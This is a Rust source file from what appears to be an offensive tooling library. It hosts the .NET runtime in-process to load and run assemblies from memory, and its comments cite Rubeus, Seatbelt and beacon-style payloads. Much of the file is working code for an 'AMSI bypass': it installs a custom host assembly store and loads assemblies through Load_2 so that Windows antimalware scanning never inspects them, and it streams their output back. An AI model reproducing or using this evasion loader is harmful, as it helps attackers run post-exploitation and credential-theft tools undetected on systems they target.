use crate::primitives::{
    AmsiBypassLoader, ICLRMetaHost, ICLRRuntimeHost, ICLRRuntimeInfo, ICorRuntimeHost, _AppDomain,
    _MethodInfo, empty_variant_array, get_assembly_identity_from_bytes, unpack_byte_array,
    wrap_bool_in_variant, wrap_i64_in_variant, wrap_method_arguments, RuntimeVersion, GUID, HRESULT,
};
use std::ffi::c_void;
use windows::Win32::System::Com::VARIANT;
#[cfg(feature = "default-loader")]
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};

pub struct Clr {
    contents: Vec<u8>,
    arguments: Vec<String>,
    create_interface: isize,
    context: Option<ClrContext>,
    output_context: Option<OutputContext>,
    version: RuntimeVersion,
}

pub struct ClrContext {
    pub has_started: bool,
    pub host: *mut ICLRMetaHost,
    pub runtime_info: *mut ICLRRuntimeInfo,
    pub runtime_host: *mut ICorRuntimeHost,
    pub clr_runtime_host: Option<*mut ICLRRuntimeHost>,
    pub app_domain: *mut _AppDomain,
}

pub struct OutputContext {
    pub set_out: *mut _MethodInfo,
    pub set_err: *mut _MethodInfo,
    pub to_string: *mut _MethodInfo,
    pub original_stdout: VARIANT,
    pub original_stderr: VARIANT,
    pub redirected_stdout: VARIANT,
    pub redirected_stderr: VARIANT,
}

/// Output redirection context that supports incremental draining.
///
/// Returned by [`Clr::redirect_output_streaming`]. Unlike [`OutputContext`]
/// which buffers everything into a `StringWriter` and exposes the full
/// content only at the end, this variant uses `MemoryStream` + `StreamWriter`
/// with `AutoFlush=true` so that writes from the running assembly become
/// visible immediately and can be consumed via [`Self::drain`].
///
/// `drain` and `restore` are safe to call from a thread other than the one
/// running the assembly — the underlying COM objects are accessed through
/// the CLR's standard cross-thread marshaling. This is the canonical pattern
/// for streaming `Console.Out` from a hosted runtime.
pub struct StreamingOutputContext {
    set_out: *mut _MethodInfo,
    set_err: *mut _MethodInfo,
    to_array: *mut _MethodInfo,
    set_position: *mut _MethodInfo,
    set_length: *mut _MethodInfo,
    memory_stream_instance: VARIANT,
    original_stdout: VARIANT,
    original_stderr: VARIANT,
}

unsafe impl Send for StreamingOutputContext {}
unsafe impl Sync for StreamingOutputContext {}

impl StreamingOutputContext {
    /// Returns everything written to stdout/stderr since the last call,
    /// then clears the underlying memory stream so the next call only
    /// returns new bytes.
    ///
    /// Safe to call concurrently with the assembly running on another
    /// thread. Returns an empty `Vec` if nothing has been written.
    pub fn drain(&self) -> Result<Vec<u8>, String> {
        let result = unsafe {
            (*self.to_array).invoke_without_args(Some(self.memory_stream_instance.clone()))?
        };

        // Reset the stream so we don't re-read the same bytes next time.
        unsafe {
            (*self.set_position).invoke(
                wrap_method_arguments(vec![wrap_i64_in_variant(0)])?,
                Some(self.memory_stream_instance.clone()),
            )?;
            (*self.set_length).invoke(
                wrap_method_arguments(vec![wrap_i64_in_variant(0)])?,
                Some(self.memory_stream_instance.clone()),
            )?;
        }

        let array = unsafe { result.Anonymous.Anonymous.Anonymous.parray };
        unpack_byte_array(array)
    }

    /// Restore `Console.Out` and `Console.Error` to their original writers.
    ///
    /// IMPORTANT: only call this once you know the assembly is no longer
    /// writing to the redirected stream. If a runner thread you cannot
    /// stop is still emitting output (e.g. an aborted long-running job),
    /// leak this context with [`std::mem::forget`] instead — the orphaned
    /// writes will land harmlessly in the detached `MemoryStream` and the
    /// original `Console.Out` remains untouched.
    pub fn restore(&self) -> Result<(), String> {
        unsafe {
            (*self.set_out).invoke(
                wrap_method_arguments(vec![self.original_stdout.clone()])?,
                None,
            )?;
            (*self.set_err).invoke(
                wrap_method_arguments(vec![self.original_stderr.clone()])?,
                None,
            )?;
        }
        Ok(())
    }
}

impl Clr {
    #[cfg(feature = "default-loader")]
    pub fn new(contents: Vec<u8>, arguments: Vec<String>) -> Result<Clr, String> {
        let create_interface = load_function("mscoree.dll", "CreateInterface")?;

        Ok(Clr {
            contents,
            arguments,
            create_interface,
            context: None,
            output_context: None,
            version: RuntimeVersion::V4,
        })
    }

    #[cfg(feature = "default-loader")]
    pub fn new_with_runtime(
        contents: Vec<u8>,
        arguments: Vec<String>,
        version: RuntimeVersion,
    ) -> Result<Clr, String> {
        let create_interface = load_function("mscoree.dll", "CreateInterface")?;

        Ok(Clr {
            contents,
            arguments,
            create_interface,
            context: None,
            output_context: None,
            version,
        })
    }

    #[cfg(feature = "default-loader")]
    pub fn context_only(version: Option<RuntimeVersion>) -> Result<Clr, String> {
        let create_interface = load_function("mscoree.dll", "CreateInterface")?;

        Ok(Clr {
            contents: vec![],
            arguments: vec![],
            create_interface,
            context: None,
            output_context: None,
            version: version.unwrap_or(RuntimeVersion::V4),
        })
    }

    #[cfg(not(feature = "default-loader"))]
    pub fn new(
        contents: Vec<u8>,
        arguments: Vec<String>,
        load_function: fn() -> Result<isize, String>,
    ) -> Result<Clr, String> {
        let create_interface = load_function()?;

        Ok(Clr {
            contents,
            arguments,
            create_interface,
            context: None,
            output_context: None,
            version: RuntimeVersion::V4,
        })
    }

    #[cfg(not(feature = "default-loader"))]
    pub fn new_with_runtime(
        contents: Vec<u8>,
        arguments: Vec<String>,
        version: RuntimeVersion,
        load_function: fn() -> Result<isize, String>,
    ) -> Result<Clr, String> {
        let create_interface = load_function()?;

        Ok(Clr {
            contents,
            arguments,
            create_interface,
            context: None,
            output_context: None,
            version,
        })
    }

    #[cfg(not(feature = "default-loader"))]
    pub fn context_only(
        load_function: fn() -> Result<isize, String>,
        version: Option<RuntimeVersion>,
    ) -> Result<Clr, String> {
        let create_interface = load_function()?;

        Ok(Clr {
            contents: vec![],
            arguments: vec![],
            create_interface,
            context: None,
            output_context: None,
            version: version.unwrap_or(RuntimeVersion::V4),
        })
    }

    pub fn using_runtime_host<T>(
        &mut self,
        callback: fn(*mut ICorRuntimeHost) -> Result<T, String>,
    ) -> Result<T, String> {
        let context = self.get_context()?;
        let runtime_host = context.runtime_host;

        callback(runtime_host)
    }

    pub fn use_app_domain(&mut self, app_domain: *mut _AppDomain) -> Result<(), String> {
        if self.context.is_none() {
            return Err("CLR Context has not been initialized".into());
        }

        let context = self.context.as_mut().unwrap();

        context.app_domain = app_domain;

        Ok(())
    }

    pub fn run(&mut self) -> Result<String, String> {
        self.redirect_output()?;

        let context = self.get_context()?;
        let assembly = unsafe { (*(&context).app_domain).load_assembly(&self.contents)? };

        unsafe { (*assembly).run_entrypoint(&self.arguments)? };

        self.restore_output()?;

        self.get_redirected_output()
    }

    pub fn run_no_redirect(&mut self) -> Result<String, String> {
        let context = self.get_context()?;
        let assembly = unsafe { (*(&context).app_domain).load_assembly(&self.contents)? };

        unsafe { (*assembly).run_entrypoint(&self.arguments)? };

        Ok("".to_string())
    }

    pub fn redirect_output(&mut self) -> Result<(), String> {
        let context = self.get_context()?;

        // Get mscorlib assembly
        let mscorlib = unsafe { (*(&context).app_domain).load_library("mscorlib")? };

        // Sort out console related types/functions
        let console = unsafe { (*mscorlib).get_type("System.Console")? };

        let get_out = unsafe { (*console).get_method("get_Out")? };
        let set_out = unsafe { (*console).get_method("SetOut")? };
        let get_err = unsafe { (*console).get_method("get_Error")? };
        let set_err = unsafe { (*console).get_method("SetError")? };

        let old_out = unsafe { (*get_out).invoke_without_args(None)? };
        let old_err = unsafe { (*get_err).invoke_without_args(None)? };

        // Sort out string writer related types/functions
        let string_writer = unsafe { (*mscorlib).get_type("System.IO.StringWriter")? };
        let to_string = unsafe { (*string_writer).get_method("ToString")? };

        let string_writer_instance =
            unsafe { (*mscorlib).create_instance("System.IO.StringWriter")? };

        let method_args = wrap_method_arguments(vec![string_writer_instance.clone()])?;

        // Replace stdout and stderr with the same StringWriter instance
        unsafe { (*set_out).invoke(method_args, None)? };
        unsafe { (*set_err).invoke(method_args, None)? };

        self.output_context = Some(OutputContext {
            set_out,
            set_err,
            to_string,
            original_stdout: old_out,
            original_stderr: old_err,
            redirected_stdout: string_writer_instance.clone(),
            redirected_stderr: string_writer_instance.clone(),
        });

        Ok(())
    }

    pub fn restore_output(&mut self) -> Result<(), String> {
        if self.output_context.is_none() {
            return Err("Output context has not been initialized".into());
        }

        let context = self.output_context.as_ref().unwrap();

        unsafe {
            (*(&context).set_out).invoke(
                wrap_method_arguments(vec![context.original_stdout.clone()])?,
                None,
            )?
        };

        unsafe {
            (*(&context).set_err).invoke(
                wrap_method_arguments(vec![context.original_stderr.clone()])?,
                None,
            )?
        };

        Ok(())
    }

    pub fn get_redirected_output(&mut self) -> Result<String, String> {
        if self.output_context.is_none() {
            return Err("Output context has not been initialized".into());
        }

        let context = self.output_context.as_ref().unwrap();
        let instance = context.redirected_stdout.clone();

        let result = unsafe {
            (*(&context).to_string).invoke(empty_variant_array(), Some(instance.clone()))?
        };

        Ok(unsafe { result.Anonymous.Anonymous.Anonymous.bstrVal.to_string() })
    }

    /// Redirect `Console.Out` and `Console.Error` to a `MemoryStream` whose
    /// contents can be drained from any thread via the returned
    /// [`StreamingOutputContext`]. Useful for long-running or interactive
    /// assemblies (Rubeus monitor, beacon-style payloads) where output must
    /// be reported incrementally rather than only at completion.
    ///
    /// The companion to this is [`Clr::run_with_amsi_bypass_no_redirect`] (or
    /// any other run variant that does not call [`Clr::redirect_output`]):
    /// run the assembly on a separate thread while polling
    /// [`StreamingOutputContext::drain`] from the main thread.
    ///
    /// See `examples/streaming_output.rs` for the full pattern.
    pub fn redirect_output_streaming(&mut self) -> Result<StreamingOutputContext, String> {
        let context = self.get_context()?;
        let app_domain = context.app_domain;

        let mscorlib = unsafe { (*app_domain).load_library("mscorlib")? };

        // MemoryStream — backing store we can drain.
        let memory_stream = unsafe { (*mscorlib).get_type("System.IO.MemoryStream")? };
        let to_array = unsafe { (*memory_stream).get_method("ToArray")? };
        let set_position = unsafe { (*memory_stream).get_method("set_Position")? };
        let set_length = unsafe { (*memory_stream).get_method("SetLength")? };
        let memory_stream_instance =
            unsafe { (*mscorlib).create_instance("System.IO.MemoryStream")? };

        // StreamWriter wrapping the MemoryStream, with AutoFlush so each
        // WriteLine is visible to the polling thread without an explicit Flush.
        let stream_writer = unsafe { (*mscorlib).get_type("System.IO.StreamWriter")? };
        let stream_writer_constructor = unsafe {
            (*stream_writer).get_constructor_with_signature("Void .ctor(System.IO.Stream)")?
        };
        let stream_writer_instance = unsafe {
            (*stream_writer_constructor)
                .invoke(wrap_method_arguments(vec![memory_stream_instance.clone()])?)?
        };

        let auto_flush_property = unsafe { (*stream_writer).get_property("AutoFlush")? };
        unsafe {
            (*auto_flush_property).set_value(
                wrap_bool_in_variant(true),
                Some(stream_writer_instance.clone()),
            )?;
        }

        // Save the original Console.Out / Console.Error so we can restore them.
        let console = unsafe { (*mscorlib).get_type("System.Console")? };
        let get_out = unsafe { (*console).get_method("get_Out")? };
        let set_out = unsafe { (*console).get_method("SetOut")? };
        let get_err = unsafe { (*console).get_method("get_Error")? };
        let set_err = unsafe { (*console).get_method("SetError")? };
        let original_stdout = unsafe { (*get_out).invoke_without_args(None)? };
        let original_stderr = unsafe { (*get_err).invoke_without_args(None)? };

        // Replace stdout and stderr with the auto-flushing StreamWriter.
        unsafe {
            (*set_out).invoke(
                wrap_method_arguments(vec![stream_writer_instance.clone()])?,
                None,
            )?;
            (*set_err).invoke(
                wrap_method_arguments(vec![stream_writer_instance.clone()])?,
                None,
            )?;
        }

        Ok(StreamingOutputContext {
            set_out,
            set_err,
            to_array,
            set_position,
            set_length,
            memory_stream_instance,
            original_stdout,
            original_stderr,
        })
    }

    pub fn get_context(&mut self) -> Result<&ClrContext, String> {
        if self.context.is_some() {
            return Ok(self.context.as_ref().unwrap());
        }

        let host = self.get_clr_host()?;
        let runtime_info = unsafe { (*host).get_first_available_runtime(Some(self.version))? };
        let runtime_host = unsafe { (*runtime_info).get_runtime_host()? };

        unsafe {
            if (*runtime_info).can_be_loaded()? && !(*runtime_info).has_started()? {
                (*runtime_host).start()?;
            }
        };

        let app_domain = unsafe { (*runtime_host).get_default_domain()? };

        self.context = Some(ClrContext {
            has_started: true,
            host,
            runtime_info,
            runtime_host,
            clr_runtime_host: None,
            app_domain,
        });

        Ok(self.context.as_ref().unwrap())
    }

    fn get_clr_host(&self) -> Result<*mut ICLRMetaHost, String> {
        pub type CreateInterface = fn(
            class_id: *const GUID,
            interface_id: *const GUID,
            interface: *mut *mut c_void,
        ) -> HRESULT;

        let create_interface: CreateInterface =
            unsafe { std::mem::transmute(self.create_interface) };

        let host: *mut ICLRMetaHost = ICLRMetaHost::new(create_interface)?;

        return Ok(host);
    }

    // ========================================================================
    // AMSI Bypass methods - Load assemblies via Load_2 without AMSI scanning
    // ========================================================================

    /// Initialize the CLR context with AMSI bypass enabled
    /// This sets up a custom IHostControl with IHostAssemblyStore
    /// that intercepts assembly loading via Load_2
    ///
    /// IMPORTANT: Call this BEFORE the runtime starts!
    pub fn get_context_with_amsi_bypass(
        &mut self,
        bypass_loader: &mut AmsiBypassLoader,
    ) -> Result<&ClrContext, String> {
        if self.context.is_some() {
            return Err(
                "Context already initialized. AMSI bypass must be set before runtime starts."
                    .into(),
            );
        }

        let host = self.get_clr_host()?;
        let runtime_info = unsafe { (*host).get_first_available_runtime(Some(self.version))? };

        // Get ICLRRuntimeHost (not ICorRuntimeHost) - this has SetHostControl
        let clr_runtime_host = unsafe { (*runtime_info).get_clr_runtime_host()? };

        // Check if the CLR runtime was already started by a previous assembly execution
        // in this process. SetHostControl MUST be called before Start(), so if the
        // runtime is already running (e.g. second execute-assembly call) we skip it.
        // E_ACCESSDENIED (0x80070005) is returned if we call SetHostControl after Start().
        let already_started = unsafe { (*runtime_info).has_started().unwrap_or(false) };

        let registered_clr_host = if !already_started {
            // Runtime not yet started: register our IHostAssemblyStore for AMSI bypass
            let host_control = bypass_loader.create_host_control();
            unsafe { (*clr_runtime_host).set_host_control(host_control)? };

            unsafe {
                if (*runtime_info).can_be_loaded()? {
                    (*clr_runtime_host).start()?;
                }
            };

            Some(clr_runtime_host)
        } else {
            // Runtime already running — SetHostControl would fail with E_ACCESSDENIED.
            // Fall back: AMSI bypass is not applied for this execution, but at least
            // we can still load and run the assembly via the existing AppDomain.
            None
        };

        // Get the legacy runtime host for AppDomain access
        let runtime_host = unsafe { (*runtime_info).get_runtime_host()? };
        let app_domain = unsafe { (*runtime_host).get_default_domain()? };

        self.context = Some(ClrContext {
            has_started: true,
            host,
            runtime_info,
            runtime_host,
            clr_runtime_host: registered_clr_host,
            app_domain,
        });

        Ok(self.context.as_ref().unwrap())
    }

    /// Run an assembly using AMSI bypass
    /// 1. Register the assembly bytes with a custom identity
    /// 2. Call Load_2(identity) - CLR asks our ProvideAssembly for bytes
    /// 3. AMSI never sees the assembly because Load_2 is not instrumented!
    pub fn run_with_amsi_bypass(
        &mut self,
        bypass_loader: &mut AmsiBypassLoader,
        assembly_identity: &str,
    ) -> Result<String, String> {
        // Register the assembly bytes
        bypass_loader.register_assembly(assembly_identity, self.contents.clone())?;

        // IMPORTANT: initialize context with AMSI bypass BEFORE redirect_output().
        // redirect_output() calls get_context() internally, which would start the CLR
        // without the AMSI bypass if called first. Since get_context() returns the
        // existing context if already initialized, we must set the bypass context first.
        self.get_context_with_amsi_bypass(bypass_loader)?;

        self.redirect_output()?;

        let context = self.context.as_ref().ok_or("Context not initialized")?;

        // Load using Load_2 with our custom identity
        // The CLR will call our ProvideAssembly which returns the bytes via IStream
        let assembly = unsafe { (*context.app_domain).load_library(assembly_identity)? };

        unsafe { (*assembly).run_entrypoint(&self.arguments)? };

        self.restore_output()?;

        self.get_redirected_output()
    }

    /// Run an assembly using AMSI bypass without output redirection
    pub fn run_with_amsi_bypass_no_redirect(
        &mut self,
        bypass_loader: &mut AmsiBypassLoader,
        assembly_identity: &str,
    ) -> Result<String, String> {
        // Register the assembly bytes
        bypass_loader.register_assembly(assembly_identity, self.contents.clone())?;

        let context = self.get_context_with_amsi_bypass(bypass_loader)?;

        // Load using Load_2 - AMSI bypass!
        let assembly = unsafe { (*context.app_domain).load_library(assembly_identity)? };

        unsafe { (*assembly).run_entrypoint(&self.arguments)? };

        Ok("".to_string())
    }

    /// Run an assembly using AMSI bypass with automatic identity extraction
    /// This extracts the assembly identity from the bytes using ICLRAssemblyIdentityManager
    /// The identity MUST match for the CLR to accept our assembly!
    ///
    /// Reference: https://github.com/xforcered/Being-A-Good-CLR-Host
    pub fn run_with_amsi_bypass_auto(
        &mut self,
        bypass_loader: &mut AmsiBypassLoader,
    ) -> Result<String, String> {
        // First, get the assembly identity from the bytes
        let identity = self.get_assembly_identity()?;

        // Now run with the correct identity
        self.run_with_amsi_bypass(bypass_loader, &identity)
    }

    /// Run an assembly using AMSI bypass with automatic identity extraction (no redirect)
    pub fn run_with_amsi_bypass_auto_no_redirect(
        &mut self,
        bypass_loader: &mut AmsiBypassLoader,
    ) -> Result<String, String> {
        let identity = self.get_assembly_identity()?;
        self.run_with_amsi_bypass_no_redirect(bypass_loader, &identity)
    }

    /// Extract assembly identity from bytes using direct PE metadata parsing.
    /// Returns something like: "Seatbelt, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"
    ///
    /// This replaces the broken ICLRAssemblyIdentityManager approach which failed with
    /// HRESULT(0x80040154) REGDB_E_CLASSNOTREG because:
    ///   1. The CLSID_CLRAssemblyIdentityManager constant was incorrect
    ///   2. ICLRRuntimeInfo::GetInterface does NOT support ICLRAssemblyIdentityManager
    pub fn get_assembly_identity(&self) -> Result<String, String> {
        if self.contents.is_empty() {
            return Err("No assembly bytes loaded".into());
        }

        get_assembly_identity_from_bytes(&self.contents)
    }
}

#[cfg(feature = "default-loader")]
fn load_function(library_name: &str, function_name: &str) -> Result<isize, String> {
    let library = match unsafe {
        LoadLibraryA(windows::core::PCSTR::from_raw(
            format!("{}\0", library_name).as_ptr(),
        ))
    } {
        Ok(hinstance) => hinstance,
        Err(e) => return Err(format!("Error while loading `{}`: {}", library_name, e)),
    };

    return match unsafe {
        GetProcAddress(
            library,
            windows::core::PCSTR::from_raw(format!("{}\0", function_name).as_ptr()),
        )
    } {
        None => Err(format!(
            "Could not locate `{}` in `{}`",
            function_name, library_name
        )),
        Some(f) => Ok(f as isize),
    };
}
